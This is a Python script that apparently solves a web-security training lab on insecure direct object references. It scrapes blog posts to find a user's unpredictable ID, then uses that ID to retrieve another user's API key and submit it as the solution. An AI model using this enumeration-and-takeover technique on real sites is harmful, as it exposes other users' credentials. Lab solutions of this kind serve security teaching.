#!/usr/bin/env python3
"""User ID controlled by request parameter, with unpredictable user IDs"""

from typing import Generator, NamedTuple

import requests
import bs4

import lab_07

User = NamedTuple("User", [("name", str), ("id", str)])

class Lab(lab_07.Lab):
    """Wrapper"""

    def yield_posts(self) -> Generator[requests.models.Response, None, None]:
        """Get all the blog posts"""
        for i in range(1, 100):
            payload = {"postId": i}
            response = self.get(self.url + "/post", params=payload)
            if response.status_code == 200:
                yield response
            else:
                break

    @staticmethod
    def get_author(post: str) -> User:
        """Return the post author"""
        soup = bs4.BeautifulSoup(post, features="lxml")
        span_a = soup.find("span", attrs={"id": "blog-author"}).a
        user_name = span_a.contents[0]
        user_id = span_a["href"].split("userId=")[1]
        return User(user_name, user_id)

    def get_user_from_name(self, name: str) -> User:
        """Given name, return id"""
        for post in self.yield_posts():
            user = self.get_author(post.text)
            if user.name == name:
                return user
        raise ValueError(f"Couldn't find user {name}")

def main() -> None:
    """Entry point"""
    site = Lab()
    carlos = site.get_user_from_name("carlos")
    api_key = site.get_api_key_from_user_id(carlos.id)
    response = site.submit_solution(api_key)
    print(response.status_code)

if __name__ == "__main__":
    main()
